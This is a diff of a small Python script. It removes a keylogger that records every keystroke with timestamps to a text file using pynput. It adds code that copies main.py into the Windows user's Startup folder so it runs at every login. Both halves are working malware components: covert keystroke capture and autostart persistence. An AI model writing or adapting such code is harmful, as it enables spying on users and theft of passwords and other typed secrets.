@@ -1,13 +1,6 @@
-from pynput.keyboard import Listener
-import logging
-
-logging.basicConfig(
-    filename=("logs.txt"),
-    level = logging.DEBUG, format="%(asctime)s: %(message)s"
+import os
+from shutil import copyfile
+copyfile(
+    "main.py",
+    f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.py"
 )
-
-def onPress(key):
-    logging.info(str(key).strip("<>"))
-
-with Listener(on_press=onPress) as listener:
-    listener.join()
